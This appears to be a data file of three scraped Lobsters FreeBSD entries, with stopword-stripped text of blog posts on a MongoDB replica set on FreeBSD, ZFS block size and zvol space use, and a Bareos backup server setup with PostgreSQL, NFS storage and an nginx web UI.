387,Lobsters,freebsd,FreeBSD,Addendum - MongoDB Cluster Replica Set on FreeBSD,https://vermaden.wordpress.com/2018/05/07/addendum-mongodb-cluster-replica-set-on-freebsd/,addendum mongodb cluster replica set freebsd,mongodb replica set cluster oracle linux host command mongox command virtualbox freebsd install freebsd desktop part install node address role cat etcrcconf cat bootloaderconf cat etcsysctlconf freebsd limit expr expr ssh p root localhost cat bootloaderconf eof fastboot mongodb limit eof ssh p root localhost cat etcsysctlconf eof mongodb limit eof done ssh p root localhost reboot done mongodb startup script diff u rootmongodorg usrlocaletcrcdmongod cat etcrcconf time daemon sysrc ntpdenableyes service ntpd start cat etcrcconf like,recently created guide setup mongodb replica set cluster oracle linux would like add note setting setup freebsd system post difference oracle linux freebsd setup check original post mongodb instruction distinguish command type host system mongox node use two different prompt way obvious command execute command host system host command command mongox node root mongox command virtualbox machine generally list freebsd setup would still use virtualbox nat network connectivity virtual machine communication freebsd install freebsd install would generally freebsd desktop part install guide thing time installed first node reboot connected internet dhclient command added mongodb package pkg install command cloned machine remaining node remember regenerate mac address virtualbox interface machine two machine share mac address funny thing happen table list mongodb node ip address role use node address role data data data data arbiter contain data last node arbiter role node data role freebsd installation finished tuned etcrcconf file machine look follows x node number main freebsd configuration file root mongox cat etcrcconf network hostnamemongox inet daemon zfsenableyes sshdenableyes mousedenableyes syslogdflags s sendmailenablenone cleartmpenableyes dumpdevno boot parameter root mongox cat bootloaderconf installer zfsloadyes parameter set run time root mongox cat etcsysctlconf installer freebsd limit mongodb prefers number file limit least number process limit least time number file limit warning displayed mongodb control initandlisten warning soft rlimits low rlimits set process file number process least time number file make number aligned use file process host expr host expr set boot parameter host ssh p root localhost cat bootloaderconf eof fastboot mongodb limit eof done run time parameter host ssh p root localhost cat etcsysctlconf eof mongodb limit eof done host reboot make boot parameter take effect host ssh p root localhost reboot done mongodb startup script order mongodb work correctly freebsd one parameter need added mongodb mongod startup scipt parameter setparameterdisabledsecureallocatordomains need added mongodflags parameter may modify usrlocaletcrcdmongod script specify custom mongodflags parameter etcrcconf file case would want patch usrlocaletcrcdmongod script diff root diff u rootmongodorg usrlocaletcrcdmongod rootmongodorg usrlocaletcrcdmongod mongodenable mongodlimits mongoddbpath vardbmongodb mongodflags logpath mongoddbpath mongodlog logappend mongodflags logpath mongoddbpath mongodlog logappend setparameterdisabledsecureallocatordomains mongoduser mongodb mongodgroup mongodb mongodconfig usrlocaletcmongodbconf put change together etcrcconf file needed change mongodb node root mongox cat etcrcconf network hostnamemongox inet daemon zfsenableyes sshdenableyes mousedenableyes syslogdflags s sendmailenablenone cleartmpenableyes dumpdevno mongodb mongodenableyes mongodflags logpath vardbmongodbmongodlog logappend setparameterdisabledsecureallocatordomains time daemon every cluster need synchronize time cluster node enable ntpd root mongox sysrc ntpdenableyes ntpdenable yes root mongox service ntpd start starting ntpd final etcrcconf file adding ntpd time daemon root mongox cat etcrcconf network hostnamemongox inet daemon zfsenableyes sshdenableyes ntpdenableyes mousedenableyes syslogdflags s sendmailenablenone cleartmpenableyes dumpdevno mongodb mongodenableyes mongodflags logpath vardbmongodbmongodlog logappend setparameterdisabledsecureallocatordomains thats change may start mongodb instance node create cluster specified original article eof like like loading related
388,Lobsters,freebsd,FreeBSD,The Importance of ZFS Block Size,http://brian.candler.me/posts/the-importance-of-zfs-blocksize/,importance zfs block size,official recommendation set block size copying sparse file zvol matching block size happening choose might,one important tunables zfs recordsize normal datasets volblocksize zvols default respectively understand unit work zfs modify one byte large file default record size cause whole read one byte changed new block written result official recommendation use block size aligns underlying workload example using database read writes chunk use block size running vms containing filesystem us block size set block size side effect immediately obvious discovered tried converting vm image file zvol copying sparse file zvol vm image file wanted migrate zvol root cd root l lh total rwx root root apr root du sch total see total file size touched consumes space sparse file used space also visible looking zfs filesystem file resides root zfs list r zfsvm name used avail refer mountpoint zfsvm zfsvm good far created zvol hold using recommended block size zfs create b v ignore uuids come ganeti vm manager using tried copy image file whilst maintaining sparseness touching block zvol needed touched qemuimg normal tool choice qemuimg convert f raw raw much disk space copy use root zfs list r zfsvm name used avail refer mountpoint zfsvm zfsvm bad original used copy us almost entire touched gone wrong maybe qemuimg working expect destroy recreate zvol use different command copy dd convsparse got exactly poor result clearly qemuimg fault matching block size finally realised difference zfs filesystem zvol block size recreated zvol block size zfs destroy zfs create b v repeated qemuimg command looked size root zfs list r zfsvm name used avail refer mountpoint zfsvm zfsvm better disk usage zvol exactly sparse file filesystem dataset affect speed timing block root zfs create b v root time qemuimg convert f raw raw real user sys block root zfs create b v root time qemuimg convert f raw raw real user sys seems large block size much faster large sequential writes like amount cpu time le wallclock time faster may underlying device ssd naturally us flash erase page aside hardware intel nuc ram crucial ssd happening think least two thing play firstly smaller block size mean proportionately higher zfs overhead checksum block indirect block pointer notice used ie allocatedreserved value zvol block block secondly think compression work efficiently given larger block compress know sure actual mechanism play best guess empirically space efficiency strongly influenced block size choosing small block size result significantly larger disk space usage choose firstly benchmarking zfs datasets versus zvols need use identical block size condition might find perform le might used using vm image zfs datasets recordsize performance sufficient need may well use zvols volblocksize maximise disk compression extra io overhead large block size might matter much enough ram system hot area remain arc cache otherwise may want tune block size workload true whether using zfs filesystem zvol note volblocksize zvol set volume creation time copy new zvol change blocksize recordsize filesystem dataset changed affect existing file either need rewrite file copy dataset get full effect finally relevant performance issue
389,Lobsters,freebsd,FreeBSD,Bareos Backup Server on FreeBSD,https://vermaden.wordpress.com/2018/05/01/bareos-backup-server-on-freebsd/,bareos backup server freebsd,bareos forked bacula ibm tsm spectrum protect veritas cluster server html pdf faq system replica freebsd desktop part install cat etcrcconf cat bootloaderconf cat etcsysctlconf zfs set mountpointnone zroot cat etccrondsendmailcleanclientmqueue eof clean sendmail root binrm r f varspoolclientmqueue eof grep etchosts nc v bareosorg package grep etcpkgfreebsdconf sed squarterlylatestg etcpkgfreebsdconf grep etcpkgfreebsdconf pkg search bareos pkg install bareosclient bareosserver bareoswebui nginx id bareos id pgsql id www postgresql cat etcloginconf eof postgresql pgsql setenvlccollatec tcdefault eof grep b pgsql etcloginconf capmkdb etcloginconf grep postgresql usrlocaletcrcdpostgresql grep bareos etcrcconf usrlocaletcrcdpostgresql initdb usrlocaletcrcdpostgresql start chown r bareos bareos usrlocaletcbareos find usrlocaletcbareos type f exec chmod find usrlocaletcbareos type exec chmod find usrlocaletcbareos name sample delete cp usrlocaletcbareos usrlocaletcbareosorg cat usrlocaletcbareosbareosdirdcatalogmycatalogconf pw groupmod bareos pgsql id pgsql pw groupmod bareos www id www su pgsql whoami usrlocallibbareosscriptscreatebareosdatabase usrlocallibbareosscriptsmakebareostables usrlocallibbareosscriptsgrantbareosprivileges su bareos c psql l su pgsql whoami cat usrlocalpgsqlvacuumsh devnull usrlocalbinreindexdb devnull devnull usrlocalbinreindexdb devnull devnull eof chmod x usrlocalpgsqlvacuumsh cat usrlocalpgsqlvacuumsh crontab e exit cat varcrontabspgsql su pgsql c crontab l storage mkdir bareos bareosdr mount nfs cat etcfstab eof dev mnt f opts dp nfspribackuporg exportbareos bareos nfs rw noatime soft intr nfssecbackuporg exportbareosdr bareosdr nfs rw noatime soft intr eof mkdir p bareosbootstrap mkdir p bareosrestore mkdir p bareosstoragefilestorage mkdir p bareosdrbootstrap mkdir p bareosdrrestore mkdir p bareosdrstoragefilestorage chown r bareos bareos bareos bareosdr find bareos bareosdr l column bareos cat usrlocaletcbareosbareosdirdcatalogmycatalogconf cat usrlocaletcbareosbconsoledbconsoleconf cat usrlocaletcbareosbareosdirddirectorbareosdirconf cat usrlocaletcbareosbareosdirdjobrestorefilesconf cat usrlocaletcbareosbareosdirdclientdefaultconf cat usrlocaletcbareosbareosdirdclientreplicabackuporgconf cat usrlocaletcbareosbareosdirdjobbackupcatalogconf cat usrlocaletcbareosbareosdirdmessagesstandardconf message cat usrlocaletcbareosbareosdirdmessagesdaemonconf pool l l usrlocaletcbareosbareosdirdpool rm f usrlocaletcbareosbareosdirdpool conf cat usrlocaletcbareosbareosdirdpoolbronzedailypoolconf cat usrlocaletcbareosbareosdirdpoolbronzemonthlypoolconf cat usrlocaletcbareosbareosdirdscheduleweeklycycleconf cat usrlocaletcbareosbareosdirdscheduleweeklycycleconf cat usrlocaletcbareosbareosdirdjobdefsdefaultjobconf cat usrlocaletcbareosbareosdirdstoragefileconf cat usrlocaletcbareosbareosdirdconsolebareosmonconf cat usrlocaletcbareosbareosdirdfilesetcatalogconf cat usrlocaletcbareosbareosdirdfilesetselftestconf l l usrlocaletcbareosbareosdirdfileset rm f usrlocaletcbareosbareosdirdfilesetlinuxallconf rm f usrlocaletcbareosbareosdirdfilesetwindowsalldrivesconf cat usrlocaletcbareosbareosdirdfilesetwindowsconf cat usrlocaletcbareosbareosdirdfilesetunixconf cat usrlocaletcbareosbareosdirdprofileoperatorconf cat usrlocaletcbareosbareossddmessagesstandardconf cat usrlocaletcbareosbareossdddevicefilestorageconf cat usrlocaletcbareosbareossddstoragebareossdconf cat usrlocaletcbareosbareossdddirectorbareosmonconf cat usrlocaletcbareosbareossdddirectorbareosdirconf cat usrlocaletcbareosbareosfddmessagesstandardconf cat usrlocaletcbareosbareosfdddirectorbareosdirconf cat usrlocaletcbareosbareosfdddirectorbareosmonconf cat usrlocaletcbareosbareosfddclientmyselfconf cat usrlocaletcbareosbareosdirdclientbareosfdconf cd usrlocaletcbareos pwd grep r password sort k column chown r bareos bareos usrlocaletcbareos find usrlocaletcbareos type f exec chmod find usrlocaletcbareos type exec chmod bareos webui cat usrlocaletcnginxnginxconf cp usrlocaletcphpiniproduction usrlocaletcphpini vi usrlocaletcphpini europewarsaw diff u phpiniproduction phpini cat usrlocaletcphpfpmconf cat usrlocaletcbareosbareosdirdconsoleadminconf cat usrlocaletcbareosbareosdirdprofilewebuiadminconf cat usrlocaletcbareoswebuidirectorsini cat usrlocaletcbareoswebuiconfigurationini chown r www www usrlocaletcbareoswebui chown r www www usrlocalwwwbareoswebui log chown r bareos bareos varlogbareos varlogphpfpmlog chown r www www varlogphpfpmlog chown r www www varlognginx grep confd etcnewsyslogconf mkdir p usrlocaletcnewsyslogconfd cat usrlocaletcnewsyslogconfdbareos eof bareos varlogphpfpmlog www www j varlognginxaccesslog www www j varlognginxerrorlog www www j varlogbareosbareoslog bareos bareos j varlogbareosbareosauditlog bareos bareos j eof newsyslog v tail skel usrlocaletcrcdbareossd onestart cat usrlocaletcbareosbareosdirconf eof usrlocaletcbareosbareosdird eof cat usrlocaletcbareosbareosfdconf eof usrlocaletcbareosbareosfdd eof cat usrlocaletcbareosbareossdconf eof usrlocaletcbareosbareossdd eof cat usrlocaletcbareosbconsoleconf eof usrlocaletcbareosbconsoled eof cat usrlocaletcbareosbareosdirconf cat usrlocaletcbareosbareosfdconf cat usrlocaletcbareosbareossdconf cat usrlocaletcbareosbconsoleconf chown r bareos bareos usrlocaletcbareos find usrlocaletcbareos type f exec chmod find usrlocaletcbareos type exec chmod alive cat etcrcconf usrlocaletcrcdpostgresql status usrlocaletcrcdphpfpm start usrlocaletcrcdnginx start usrlocaletcrcdbareossd start usrlocaletcrcdbareosfd start usrlocaletcrcdbareosdir start sockstat rcorder etcrcd usrlocaletcrcd grep e bareosphpfpmnginxpostgresql http job mkdir rootbin mv bronzeschedshkey bronzeschedsh mv bronzejobshkey bronzejobsh chmod x rootbinbronzeschedsh chmod x rootbinbronzejobsh rootbinbronzeschedsh rootbinbronzejobsh client replicabackuporg rootbinbronzeschedsh rm f rootbinbronzejobsh replicabackuporg unix echo reload bconsole replicabackuporg job job job job dashboard job job dashboard restore restore restore job dashboard volume volume director message ibm tsm ibm spectrum protect l l tmpbareosrestorescopyright tmpbareosrestorescopyright copyright column remote replica pkg install rsync usrlocalbinrsync r u l p force nowholefile numericids deleteafter bareos bareosdr crontab e crontab l summary update die hard tribute loader die hard update bareos backup server freebsd bsd bare o update additional permission like,ever heard bareos probably heard bacula read difference bareos forked bacula interested enterprise backup solution check ibm tsm spectrum protect veritas cluster server article bareos backup archiving recovery open sourced network based open source backup solution open source fork backup project baculaorg site fork development since late lot new feature source published github licensed license bareos support always incremental backup interesting especially user big data time network capacity consuming full backup taken bareos come webui administration task restore file browser bareos backup data disk tape drive well tape library support compression encryption hardwarebased like lto tape drive softwarebased also get professional service support bareos well bareos subscription service provides access special quality assured installation package started sysadmin job backup system one new responsibility like going back root look backup market popular especially cloud oriented environment implement various level protection like gold silver bronze example course different retention time number backup kept different rto rpo example implementation bronze level backup bareos used group b c full backup starting day group day b group day c group way still full backup quite often group balance network load day full backup differential backup people often confuse incremental backup difference differential backup always full backup always one level combining incremental one done last done backup type possible level combining earlier incremental backup full backup prefer differential one faster recovery backup generally recovery peoplecompanies tend forget implementation bronze three group perfect job also made simulation group overlap endbeginning month result bad taste today show install configure bareos server based freebsd operating system simplified setup service single machine bareosdir bareossd bareoswebui bareosfd also assume order provide storage space backup data would mount resource external nfs share get touch bareos terminology technology check great manual html pdf version depending format prefer reading documentation also faq provides lot needed answer also diagram may useful get grip bareos world system every system need name use latin word closest backup replica freebsd system hostname install would generally freebsd desktop part install article installed freebsd system login prompt sorry resist important configuration file time vi root replica cat etcrcconf network hostnamereplicabackuporg inet defaultrouter daemon zfsenableyes sshdenableyes nfsclientenableyes syslogdflags s sendmailenablenone cleartmpenableyes dumpdevno bareos postgresqlenableyes postgresqlclasspgsql bareosdirenableyes bareossdenableyes bareosfdenableyes phpfpmenableyes nginxenableyes see core service bareos currently disabled purpose enable later parameter module set boot root replica cat bootloaderconf boot option module zfsloadyes ipc parameter set runtime root replica cat etcsysctlconf security zfs disable annoying thing ipc install disable zroot mounting root replica zfs set mountpointnone zroot sendmail disabled need take care queue root replica cat etccrondsendmailcleanclientmqueue eof clean sendmail root binrm r f varspoolclientmqueue eof assuming nfs server configured etchosts file complete etchosts file would look like root replica grep etchosts localhost localhostmydomain localhost localhostmydomain replicabackuporg replica nfspribackuporg nfspri nfssecbackuporg nfssec let verify outside world connectivity needed adding bareos package root replica nc v bareosorg connection bareosorg port tcphttps succeeded c root replica package want latest package modify etcpkgfreebsdconf pkg repository file latest package root replica grep etcpkgfreebsdconf freebsd url pkghttp pkgfreebsdorg abi quarterly mirrortype srv signaturetype fingerprint fingerprint usrsharekeyspkg enabled yes root replica sed squarterlylatestg etcpkgfreebsdconf root replica grep etcpkgfreebsdconf freebsd url pkghttp pkgfreebsdorg abi latest mirrortype srv signaturetype fingerprint fingerprint usrsharekeyspkg enabled yes use bareos package pkg available need waste time power compilation root replica pkg search bareos package management tool yet installed system want fetch install yn backup archiving recovery open sourced gui backup archiving recovery open sourced client backup archiving recovery open sourced static client bareos document set pdf backup archiving recovery open sourced server backup archiving recovery open sourced traymonitor phpfrontend manage bareos web install bareos along needed component environment root replica pkg install bareosclient bareosserver bareoswebui nginx bareos pgsql www user added pkg along package root replica id bareos bareos bareos bareos root replica id pgsql pgsql pgsql pgsql root replica id www www www www postgresql first setup postgresql database add separate pgsql login class postgresql database user root replica cat etcloginconf eof postgresql pgsql setenvlccollatec tcdefault eof one rare occasion would appreciate p flag aix grep command display whole paragraph root replica grep b pgsql etcloginconf postgresql pgsql setenvlccollatec tcdefault let reload login database root replica capmkdb etcloginconf postgresql rc startup script option set etcrcconf file root replica grep postgresql usrlocaletcrcdpostgresql postgresqlenable yes postgresqldata usrlocalpgsqldata postgresqlflags w fast postgresqlinitdbflags lccollatec postgresqlclass default postgresqlprofiles need postgresqlenable postgresqlclass set enable etcrcconf file root replica grep bareos etcrcconf bareos postgresqlenableyes postgresqlclasspgsql bareosdirenableyes bareossdenableyes bareosfdenableyes phpfpmenableyes nginxenableyes init postgresql database bareos root replica usrlocaletcrcdpostgresql initdb file belonging database system owned user pgsql user must also server process database cluster initialized locale collate c ctype message monetary numeric time default text search configuration set english data page checksum disabled creating directory usrlocalpgsqldata ok creating subdirectory ok selecting default maxconnections selecting default sharedbuffers selecting dynamic shared memory implementation posix creating configuration file ok creating database ok initializing pgauthid ok initializing dependency ok creating system view ok loading system object description ok creating collation ok creating conversion ok creating dictionary ok setting privilege builtin object ok creating information schema ok loading plpgsql serverside language ok vacuuming database ok copying ok copying postgres ok syncing data disk ok warning enabling trust authentication local connection change editing pghbaconf using option authlocal authhost next time run initdb success start database server using usrlocalbinpgctl usrlocalpgsqldata l logfile start start root replica usrlocaletcrcdpostgresql start log ending log output stderr hint future log output go log destination syslog take care bareos server configuration lot sample file need also need take care permission root replica chown r bareos bareos usrlocaletcbareos root replica find usrlocaletcbareos type f exec chmod root replica find usrlocaletcbareos type exec chmod root replica find usrlocaletcbareos name sample delete also need change permission varrun vardb directory bareos root replica chown r bareos bareos vardbbareos root replica chown r bareos bareos varrunbareos trace change keep copy original configuration track changed process configuring bareos environment root replica cp usrlocaletcbareos usrlocaletcbareosorg would configure bareos catalog usrlocaletcbareosorgbareosdirdcatalogmycatalogconf file content modification root replica cat usrlocaletcbareosbareosdirdcatalogmycatalogconf catalog name mycatalog dbdriver postgresql dbname bareos dbuser bareos dbpassword bareosdatabasepassword let make sure pgsql www user bareos group read configuration file root replica pw groupmod bareos pgsql root replica id pgsql pgsql pgsql pgsql bareos root replica pw groupmod bareos www root replica id www www www www bareos prepare postgresql database bareos instance use script provided bareos package usrlocallibbareosscripts path root replica su pgsql whoami pgsql usrlocallibbareosscriptscreatebareosdatabase creating postgresql database create database alter database database encoding ok creating bareos database succeeded usrlocallibbareosscriptsmakebareostables making postgresql table create table alter table create index create table alter table create index create table create index create index create table create index create table create index create table create index create table create table create index create table create index create table create index create index create table create table create table create table create index create table create index create table create index create table create table create table create index create table create table create index create table create index create table create table create table create table create table create table create table create table insert insert insert insert insert insert insert insert insert insert insert insert insert insert insert insert insert insert insert insert insert insert insert insert insert insert delete insert creation bareos postgresql table succeeded usrlocallibbareosscriptsgrantbareosprivileges granting postgresql table create role grant grant grant grant grant grant grant grant grant grant grant grant grant grant grant grant grant grant grant grant grant grant grant grant grant grant grant grant grant grant grant grant grant grant grant grant grant grant grant grant grant grant grant grant grant grant grant privilege user bareos granted database bareos verify needed database created root replica su bareos c psql l list database name owner encoding collate ctype access privilege bareos pgsql sqlascii c c postgres pgsql c pgsql c cpgsql pgsqlctcpgsql pgsql c cpgsql pgsqlctcpgsql row also add housekeeping script postgresql database put crontab root replica su pgsql whoami pgsql cat usrlocalpgsqlvacuumsh devnull usrlocalbinreindexdb devnull devnull usrlocalbinreindexdb devnull devnull eof chmod x usrlocalpgsqlvacuumsh cat usrlocalpgsqlvacuumsh binsh usrlocalbinvacuumdb z devnull devnull usrlocalbinreindexdb devnull devnull usrlocalbinreindexdb devnull devnull crontab e exit root replica cat varcrontabspgsql edit file edit master reinstall installed thu apr cron version freebsd usrlocalpgsqlvacuumsh root replica su pgsql c crontab l usrlocalpgsqlvacuumsh storage assume primary storage would mounted bareos directory one nfs server disaster recovery site would mounted bareosdr another nfs server example nfs configuration mount point root replica mkdir bareos bareosdr root replica mount nfs nfspribackuporg exportbareos bareos nfs noatime nfssecbackuporg exportbareosdr bareosdr nfs noatime root replica cat etcfstab eof dev mnt f opts dp nfspribackuporg exportbareos bareos nfs rw noatime soft intr nfssecbackuporg exportbareosdr bareosdr nfs rw noatime soft intr eof root replica mkdir p bareosbootstrap root replica mkdir p bareosrestore root replica mkdir p bareosstoragefilestorage root replica mkdir p bareosdrbootstrap root replica mkdir p bareosdrrestore root replica mkdir p bareosdrstoragefilestorage root replica chown r bareos bareos bareos bareosdr root replica find bareos bareosdr l column drwxrxrx bareos bareos apr bareos drwxrxrx bareos bareos apr bareosrestore drwxrxrx bareos bareos apr bareosstorage drwxrxrx bareos bareos apr bareosstoragefilestorage drwxrxrx bareos bareos apr bareosbootstrap drwxrxrx bareos bareos apr bareosdr drwxrxrx bareos bareos apr bareosdrstorage drwxrxrx bareos bareos apr bareosdrstoragefilestorage drwxrxrx bareos bareos apr bareosdrrestore drwxrxrx bareos bareos apr bareosdrbootstrap bareos already used bareosdatabasepassword bareos user postgresql bareos database use password remaining part bareos subsystem think password self explaining bareos component bareosdatabasepassword bareosdirpassword bareossdpassword bareosfdpassword bareosmonpassword adminpassword configure bareos subsystem already modified mycatalogconf file content root replica cat usrlocaletcbareosbareosdirdcatalogmycatalogconf catalog name mycatalog dbdriver postgresql dbname bareos dbuser bareos dbpassword bareosdatabasepassword content usrlocaletcbareosbconsoledbconsoleconf file modification root replica cat usrlocaletcbareosbconsoledbconsoleconf bareos user agent console configuration file director name replicabackuporg address localhost password bareosdirpassword description bareos console credential local director content usrlocaletcbareosbareosdirddirectorbareosdirconf file modification root replica cat usrlocaletcbareosbareosdirddirectorbareosdirconf director name replicabackuporg queryfile usrlocallibbareosscriptsquerysql maximum concurrent job password bareosdirpassword message daemon auditing yes enable heartbeat experience connection loss eg router firewall configuration additionally heartbeat enabled bareossd bareosfd heartbeat interval min remove comment next line load dynamic backends specified directory backend directory usrlocallib remove comment plugin directory load plugins specified directory plugin name defined specified plugins loaded otherwise director plugins dirso plugin directory plugin directory usrlocallibbareosplugins plugin name content usrlocaletcbareosbareosdirdjobrestorefilesconf file modification root replica cat usrlocaletcbareosbareosdirdjobrestorefilesconf job name restorefiles description standard restore type restore client default fileset selftest storage file pool brmo message standard bareosrestore accurate yes new usrlocaletcbareosbareosdirdclientdefaultconf file root replica cat usrlocaletcbareosbareosdirdclientdefaultconf client name default address replicabackuporg password bareosfdpassword new usrlocaletcbareosbareosdirdclientreplicabackuporgconf file root replica cat usrlocaletcbareosbareosdirdclientreplicabackuporgconf client name replicabackuporg description client resource director address replicabackuporg password bareosfdpassword file left unchanged root replica cat usrlocaletcbareosbareosdirdjobbackupcatalogconf job name backupcatalog description backup catalog database nightly save jobdefs defaultjob level full fileset catalog schedule weeklycycleafterbackup creates ascii copy catalog argument makecatalogbackuppl makecatalogbackuppl runbeforejob usrlocallibbareosscriptsmakecatalogbackuppl mycatalog deletes copy catalog runafterjob usrlocallibbareosscriptsdeletecatalogbackup sends bootstrap via mail disaster recovery sent another system please change recipient accordingly write bootstrap usrlocalbinbsmtp h localhost f bareos bootstrap job j root localhost priority run main backup file left unchanged root replica cat usrlocaletcbareosbareosdirdmessagesstandardconf message name standard description reasonable message delivery send everything email address console operatorcommand usrlocalbinbsmtp h localhost f bareos bareos intervention needed j r mailcommand usrlocalbinbsmtp h localhost f bareos bareos e c l r operator root localhost mount mail root localhost skipped saved audit console skipped saved audit append varlogbareosbareoslog skipped saved audit catalog skipped saved audit file left unchanged root replica cat usrlocaletcbareosbareosdirdmessagesdaemonconf message name daemon description message delivery daemon message job mailcommand usrlocalbinbsmtp h localhost f bareos bareos daemon message r mail root localhost skipped audit console skipped saved audit append varlogbareosbareoslog skipped audit append varlogbareosbareosauditlog audit pool default bareos come four pool configured would use delete configuration file root replica l l usrlocaletcbareosbareosdirdpool total rwrw bareos bareos apr differentialconf rwrw bareos bareos apr fullconf rwrw bareos bareos apr incrementalconf rwrw bareos bareos apr scratchconf root replica rm f usrlocaletcbareosbareosdirdpool conf create two pool daily backup monthly backup root replica cat usrlocaletcbareosbareosdirdpoolbronzedailypoolconf pool name brda pool type backup recycle yes bareos automatically recycle volume autoprune yes prune expired volume volume retention day long full backup kept maximum volume byte limit volume size something reasonable maximum volume limit number volume pool label format brda volume labeled brda root replica cat usrlocaletcbareosbareosdirdpoolbronzemonthlypoolconf pool name brmo pool type backup recycle yes bareos automatically recycle volume autoprune yes prune expired volume volume retention day long full backup kept maximum volume byte limit volume size something reasonable maximum volume limit number volume pool label format brmo volume labeled brmo file left unchanged root replica cat usrlocaletcbareosbareosdirdscheduleweeklycycleconf schedule name weeklycycle run full sat run differential sat run incremental monfri file left unchanged root replica cat usrlocaletcbareosbareosdirdscheduleweeklycycleconf schedule name weeklycycle run full sat run differential sat run incremental monfri content usrlocaletcbareosbareosdirdjobdefsdefaultjobconf file modification root replica cat usrlocaletcbareosbareosdirdjobdefsdefaultjobconf jobdefs name defaultjob type backup level differential client default fileset selftest schedule weeklycycle storage file message standard pool brda priority write bootstrap bareosbootstrap cbsr content usrlocaletcbareosbareosdirdstoragefileconf file modification root replica cat usrlocaletcbareosbareosdirdstoragefileconf storage name file address replicabackuporg password bareossdpassword device filestorage medium type file content usrlocaletcbareosbareosdirdconsolebareosmonconf file modification root replica cat usrlocaletcbareosbareosdirdconsolebareosmonconf console name bareosmon description restricted console used traymonitor get status director password bareosmonpassword commandacl status status jobacl content usrlocaletcbareosbareosdirdfilesetcatalogconf file modification root replica cat usrlocaletcbareosbareosdirdfilesetcatalogconf fileset name catalog description backup catalog dump bareos configuration file include option signature compression lzo file vardbbareos file usrlocaletcbareos content usrlocaletcbareosbareosdirdfilesetselftestconf file modification root replica cat usrlocaletcbareosbareosdirdfilesetselftestconf fileset name selftest description fileset backup file selftest include option signature compression lzo file usrlocalsbin need bundled linuxallconf windowsalldrivesconf filesets delete root replica l l usrlocaletcbareosbareosdirdfileset total rwrw bareos bareos apr catalogconf rwrw bareos bareos apr linuxallconf rwrw bareos bareos apr selftestconf rwrw bareos bareos apr windowsalldrivesconf root replica rm f usrlocaletcbareosbareosdirdfilesetlinuxallconf root replica rm f usrlocaletcbareosbareosdirdfilesetwindowsalldrivesconf define two new filesets windowsconf unixconf file new usrlocaletcbareosbareosdirdfilesetwindowsconf file root replica cat usrlocaletcbareosbareosdirdfilesetwindowsconf fileset name window enable v yes include option signature drive type fixed ignorecase yes wildfile az pagefilesys wilddir az recycler wilddir az recyclebin wilddir az system volume information exclude yes compression lzo file new usrlocaletcbareosbareosdirdfilesetunixconf file root replica cat usrlocaletcbareosbareosdirdfilesetunixconf fileset name unix include option signature calculate checksum per file one f change filessytems f type ufs f type btrfs f type filesystems given type backed f type others ignored f type f type reiserfs f type jfs f type xfs f type zfs noatime yes compression lzo file thing usually excluded exclude tmp bareos server exclude file vardbbareos file tmp file proc file sys file vartmp file journal file fsck file left unchanged root replica cat usrlocaletcbareosbareosdirdprofileoperatorconf profile name operator description profile allowing normal bareos operation command acl bvfsclearcache exit sql command acl configure create delete purge sqlquery umount unmount command acl catalog acl client acl fileset acl job acl plugin option acl pool acl schedule acl storage acl acl content usrlocaletcbareosbareossddmessagesstandardconf file modification root replica cat usrlocaletcbareosbareossddmessagesstandardconf message name standard director replicabackuporg description send message director add bareosstoragefilestorage path filestorage place backup content usrlocaletcbareosbareossdddevicefilestorageconf file modification root replica cat usrlocaletcbareosbareossdddevicefilestorageconf device name filestorage medium type file archive device bareosstoragefilestorage labelmedia yes let bareos label unlabeled medium random access yes automaticmount yes device opened read removablemedia alwaysopen description file device connecting director must name mediatype content usrlocaletcbareosbareossddstoragebareossdconf file modification root replica cat usrlocaletcbareosbareossddstoragebareossdconf storage name replicabackuporg maximum concurrent job remove comment plugin directory load plugins specified directory plugin name defined specified plugins loaded otherwise storage plugins sdso plugin directory plugin directory usrlocallibbareosplugins plugin name content usrlocaletcbareosbareossdddirectorbareosmonconf file modification root replica cat usrlocaletcbareosbareossdddirectorbareosmonconf director name bareosmon password bareossdpassword monitor yes description restricted director used traymonitor get status storage daemon content usrlocaletcbareosbareossdddirectorbareosdirconf file modification root replica cat usrlocaletcbareosbareossdddirectorbareosdirconf director name replicabackuporg password bareossdpassword description director permitted contact storage daemon content usrlocaletcbareosbareosfddmessagesstandardconf file modification root replica cat usrlocaletcbareosbareosfddmessagesstandardconf message name standard director replicabackuporg skipped restored description send relevant message director content usrlocaletcbareosbareosfdddirectorbareosdirconf file modification root replica cat usrlocaletcbareosbareosfdddirectorbareosdirconf director name replicabackuporg password bareosfdpassword description allow configured director access file daemon content usrlocaletcbareosbareosfdddirectorbareosmonconf file modification root replica cat usrlocaletcbareosbareosfdddirectorbareosmonconf director name bareosmon password bareosmonpassword monitor yes description restricted director used traymonitor get status file daemon content usrlocaletcbareosbareosfddclientmyselfconf file modification root replica cat usrlocaletcbareosbareosfddclientmyselfconf client name replicabackuporg maximum concurrent job remove comment plugin directory load plugins specified directory plugin name defined specified plugins loaded otherwise storage plugins fdso plugin directory plugin directory usrlocallibbareosplugins plugin name compatible set yes compatible bacula set new bareos feature enabled default compatible yes content usrlocaletcbareosbareosdirdclientbareosfdconf file modification root replica cat usrlocaletcbareosbareosdirdclientbareosfdconf client name bareosfd description client resource director address localhost password bareosfdpassword let see file bareos component hold password root replica cd usrlocaletcbareos root replica usrlocaletcbareos pwd usrlocaletcbareos root replica usrlocaletcbareos grep r password sort k column bareosdirddirectorbareosdirconf password bareosdirpassword bconsoledbconsoleconf password bareosdirpassword bareosdirdclientdefaultconf password bareosfdpassword bareosdirdclientbareosfdconf password bareosfdpassword bareosdirdclientreplicabackuporgconf password bareosfdpassword bareosfdddirectorbareosdirconf password bareosfdpassword bareosdirdconsolebareosmonconf password bareosmonpassword bareosfdddirectorbareosmonconf password bareosmonpassword bareosdirdstoragefileconf password bareossdpassword bareossdddirectorbareosdirconf password bareossdpassword bareossdddirectorbareosmonconf password bareossdpassword let fix right creating new file root replica chown r bareos bareos usrlocaletcbareos root replica find usrlocaletcbareos type f exec chmod root replica find usrlocaletcbareos type exec chmod bareos webui addconfigure file bareos webui interface main nginx webserver configuration file root replica cat usrlocaletcnginxnginxconf user www workerprocesses workerrlimitnofile errorlog varlognginxerrorlog event workerconnections http include mimetypes defaulttype applicationoctetstream logformat main remoteaddr remoteuser timelocal request accesslog varlognginxaccesslog main sendfile keepalivetimeout server listen servername replicabackuporg bareos root usrlocalwwwbareoswebuipublic location index indexphp tryfiles uri uri indexphp querystring location php fastcgipass fastcgiparam applicationenv production fastcgiparam scriptfilename documentroot fastcgiscriptname include fastcgiparams tryfiles uri php modify bundled config file package usrlocaletcphpiniproduction file root replica cp usrlocaletcphpiniproduction usrlocaletcphpini 